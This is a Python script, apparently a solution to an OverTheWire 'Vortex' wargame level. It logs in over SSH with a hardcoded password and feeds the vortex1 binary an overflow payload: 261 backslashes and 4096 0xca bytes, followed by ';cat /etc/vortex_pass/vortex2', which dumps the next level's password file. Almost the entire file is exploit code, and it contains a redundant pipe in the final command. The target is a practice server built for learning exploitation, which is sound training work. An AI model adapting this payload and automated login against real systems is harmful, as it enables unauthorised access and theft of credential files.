import os
import sys
import time
user = "vortex1"
host = "vortex.labs.overthewire.org"
password = "Gq#qu3bF3"
crack_string = "echo" + "\\"*261 + "\xca" + "a"*4000
crack_string = "echo" + "\\"*261+"\xca"*4096+";cat /etc/vortex_pass/vortex2"
crack_string = "python -c \'print \"\\\\\"*261+\"\\xca\"*4096+\";cat /etc/vortex_pass/vortex2\"\' | /vortex/vortex1"

os.write(0,crack_string)
#print crack_string
def run(cmd,*args):
	pid, fd = os.forkpty()
	if pid==0: # child
		os.execlp(cmd,*args)
	while True:
		try:        
			data = os.read(fd,1024)	
			time.sleep(pid/1000)
			print data
			if "password:" in data:    # ssh prompt
				os.write(fd,password+"\n")
			elif data.endswith("$ "):  # bash prompt for input
				os.write(fd,crack_string+" | /vortex/vortex1" )
				#os.write(fd,"a"*100)	
				
		except Exception: 
			pass

run("ssh", "ssh", user+"@"+host)
